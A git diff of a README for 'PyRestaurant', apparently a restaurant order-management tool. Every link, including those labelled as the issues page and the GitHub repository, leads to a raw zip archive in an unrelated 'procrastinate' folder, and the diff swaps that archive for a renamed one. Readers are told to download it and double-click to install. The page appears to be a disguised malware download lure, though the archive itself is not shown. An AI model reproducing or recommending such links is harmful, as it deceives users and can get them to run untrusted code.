@@ -1,6 +1,6 @@
 # 🍽️ PyRestaurant - Manage Restaurant Orders with Ease
 
-[![Download PyRestaurant](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip%https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip)](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip)
+[![Download PyRestaurant](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip%https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip)](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ To get started with PyRestaurant, you will need to download and install the appl
    - Disk Space: At least 100 MB of free space
 
 2. **Download PyRestaurant**
-   - Visit this page to download: [PyRestaurant Releases](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip)
+   - Visit this page to download: [PyRestaurant Releases](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip)
 
 3. **Install PyRestaurant**
    - Locate the downloaded file and double-click it to start the installation process.
@@ -34,7 +34,7 @@ To get started with PyRestaurant, you will need to download and install the appl
 
 To download the latest version of PyRestaurant, click the button below:
 
-[![Download PyRestaurant](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip%https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip)](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip)
+[![Download PyRestaurant](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip%https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip)](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip)
 
 Once you've downloaded the file, follow these steps to install:
 
@@ -54,12 +54,12 @@ Once you've downloaded the file, follow these steps to install:
 
 If you need help or want to give feedback, you can reach us through our GitHub issues page. We welcome suggestions and contributions.
 
-1. **Report Issues**: Go to the [Issues Section](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip) on our repository to report any problems you encounter.
+1. **Report Issues**: Go to the [Issues Section](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip) on our repository to report any problems you encounter.
 2. **Contribute**: If you are interested in contributing to PyRestaurant, feel free to fork the repository and submit a pull request.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/PyRestaurant.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/RanAxmad/PyRestaurant/main/procrastinate/Restaurant_Py_v2.0.zip)
 - [Documentation](#) *(Insert documentation link here once available)*
 - [FAQs](#) *(Link to frequently asked questions once available)*
 
